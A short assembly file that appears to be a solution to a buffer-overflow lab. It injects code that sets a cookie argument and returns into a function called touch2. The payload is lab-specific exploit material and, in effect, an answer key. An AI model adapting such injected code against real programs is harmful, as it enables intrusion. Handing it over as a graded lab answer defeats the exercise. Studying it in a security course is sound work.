# gcc -c solution2.s
# objdump -d solution2.s > objdump_solution2.asm

mov $0x59b997fa,%edi  # from ./cookie.txt
push $0x4017ec        # address of touch2
retq
